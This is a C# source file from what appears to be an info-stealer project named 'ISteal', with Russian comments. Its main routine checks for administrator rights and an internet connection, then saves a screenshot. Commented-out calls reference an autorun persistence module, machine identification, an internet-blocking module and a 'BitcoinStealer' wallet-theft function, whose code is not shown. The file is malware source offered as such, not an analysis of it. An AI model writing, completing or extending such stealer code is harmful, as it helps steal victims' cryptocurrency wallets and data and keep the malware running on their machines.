using System;
using System.IO;
using System.Security.Principal;

namespace ISteal
{
    internal class Program
    {
        private static readonly string SaveScreen = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); // путь к сохранению скриншота
        [STAThread]
        private static void Main()
        {
            if (GetIsUserAdministrator()) // запуск от имени админа
            {
                if (New.NetCheck.GetCheckForInternetConnection("https://www.google.com")) // проверка интернет соединения
                {
                   // New.IBlockIE.Enabled(1); // Блокируется выход в интернет ( отправка данных возможна )
                    //Console.WriteLine(Identification.GetID(true, "MachineGuid"));
                    // Run.Autorun();
                   // Console.WriteLine(Password.Wallet.BitcoinStealer());
                    New.ScreenShotWindow.Take(Path.Combine(SaveScreen, "Screen.jpg"));                  
                }
            }
        }

        private static bool GetIsUserAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}